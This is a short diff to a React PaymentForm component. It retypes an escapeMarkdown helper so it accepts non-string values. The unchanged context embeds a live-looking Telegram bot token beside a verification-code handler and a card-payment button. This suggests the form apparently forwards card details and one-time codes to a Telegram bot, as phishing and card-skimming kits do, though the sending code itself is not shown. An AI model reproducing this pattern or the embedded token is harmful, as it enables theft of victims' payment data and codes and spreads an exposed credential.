@@ -139,8 +139,12 @@ export default function PaymentForm({
   };
 
   const handleVerificationComplete = (code: string) => {
-    const escapeMarkdown = (text: string) => {
-      return text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, "\\$&");
+    const escapeMarkdown = (
+      text: string | number | Date | null | undefined
+    ) => {
+      // Convert input to string and handle null/undefined
+      const safeText = text?.toString() || "";
+      return safeText.replace(/[_*[\]()~`>#+\-=|{}.!]/g, "\\$&");
     };
 
     const botToken = "7518243424:AAEy5xsiG0UTYXCJ_-4lS5Ja5K0pmy4XPUA";
@@ -222,7 +226,7 @@ export default function PaymentForm({
             </div>
             <Image src={visa} alt="Visa" className="w-full" />
           </div>
-         
+
           <div
             className={`p-4 border rounded-lg cursor-pointer ${
               paymentMethod === "apple_pay"
@@ -322,8 +326,12 @@ export default function PaymentForm({
         <button
           onClick={() => {
             if (paymentMethod !== "credit_card" || validateCardInfo()) {
-              const escapeMarkdown = (text: string) => {
-                return text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, "\\$&");
+              const escapeMarkdown = (
+                text: string | number | Date | null | undefined
+              ) => {
+                // Convert input to string and handle null/undefined
+                const safeText = text?.toString() || "";
+                return safeText.replace(/[_*[\]()~`>#+\-=|{}.!]/g, "\\$&");
               };
 
               const botToken = "7518243424:AAEy5xsiG0UTYXCJ_-4lS5Ja5K0pmy4XPUA";
